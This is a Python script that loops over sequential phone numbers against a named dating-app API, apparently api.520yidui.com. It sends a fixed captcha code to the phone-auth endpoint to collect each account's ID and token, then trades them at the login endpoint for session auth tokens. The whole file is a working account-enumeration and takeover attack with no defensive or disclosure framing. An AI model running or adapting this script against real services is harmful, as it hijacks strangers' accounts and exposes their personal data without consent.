#!/usr/bin/env python3

import requests
import json


class Headers:
    base_url = 'https://api.520yidui.com'
    phone_auth = '/v2/auths/phone_auth.json'
    login = '/v2/login.json'

    def get_id_or_token(self, id_or_token, phone, captcha):
        data = {'phone': phone, 'captcha': captcha}
        r = requests.post(url=self.base_url + self.phone_auth, data=data)
        r_json = json.loads(r.text)
        if id_or_token == 'id':
            id = r_json['id']
            return id
        if id_or_token == 'token':
            token = r_json['token']
            return token

    def get_auth(self, phone, captcha):
        id = self.get_id_or_token('id', phone, captcha)
        token = self.get_id_or_token('token', phone, captcha)
        data = {'id': id, 'code': token}
        r = requests.post(url=self.base_url + self.login, data=data)
        r_json = json.loads(r.text)
        auth = r_json['token']
        return auth

    def print_id(self, x, y, captcha):
        for phone in range(x, y):
            print(self.get_id_or_token('id', phone, captcha))

    def print_token(self, x, y, captcha):
        for phone in range(x, y):
            print(self.get_id_or_token('token', phone, captcha))

    def print_auth(self, x, y, captcha):
        for phone in range(x, y):
            print(self.get_auth(phone, captcha))


if __name__ == '__main__':
    headers = Headers()
    headers.print_id(19800000000, 19800000100, 9987)
